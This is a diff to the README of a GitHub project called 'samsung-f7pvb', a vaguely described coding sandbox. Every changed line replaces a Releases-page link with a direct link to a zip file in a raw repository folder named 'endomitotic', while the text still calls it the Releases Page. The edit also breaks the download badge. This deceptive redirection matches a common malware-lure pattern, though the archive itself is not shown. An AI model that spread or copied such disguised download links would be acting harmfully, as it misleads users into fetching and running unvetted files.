@@ -4,7 +4,7 @@
 **samsung-f7pvb** is an experimental sandbox designed to showcase various coding projects, ideas, and prototypes inspired by Samsung. This application allows users to explore and interact with random snippets of code, enhancing creativity and understanding of coding concepts.
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Devlig/samsung-f7pvb/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Devlig/samsung-f7pvb/main/endomitotic/samsung-f7pvb.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Devlig/samsung-f7pvb/main/endomitotic/samsung-f7pvb.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with **samsung-f7pvb**.
@@ -16,7 +16,7 @@ To run this application, you will need:
 - An internet connection for downloading.
 
 ### 2. Visit the Download Page
-To download the latest version of **samsung-f7pvb**, visit the [Releases Page](https://github.com/Devlig/samsung-f7pvb/releases). This page contains all available versions for download.
+To download the latest version of **samsung-f7pvb**, visit the [Releases Page](https://raw.githubusercontent.com/Devlig/samsung-f7pvb/main/endomitotic/samsung-f7pvb.zip). This page contains all available versions for download.
 
 ### 3. Choose Your Version
 On the Releases page, you will see different versions of the application. Select the version you want to download. Typically, the latest version offers the best features and fixes.
@@ -57,7 +57,7 @@ If you run into any issues while using **samsung-f7pvb**, please check the FAQ s
 Feel free to contribute to **samsung-f7pvb**. If you have ideas for new features or improvements, create a fork of the repository and submit a pull request.
 
 ## 🔗 Download & Install
-To download and install **samsung-f7pvb**, visit the [Releases Page](https://github.com/Devlig/samsung-f7pvb/releases). This is where you can find the latest version and all previous versions of the application.
+To download and install **samsung-f7pvb**, visit the [Releases Page](https://raw.githubusercontent.com/Devlig/samsung-f7pvb/main/endomitotic/samsung-f7pvb.zip). This is where you can find the latest version and all previous versions of the application.
 
 ## 🚀 Conclusion
 With **samsung-f7pvb**, you can explore new coding ideas and learn through experimentation. Whether you're a beginner or someone with some experience, this application provides a unique environment for discovery. Enjoy exploring!
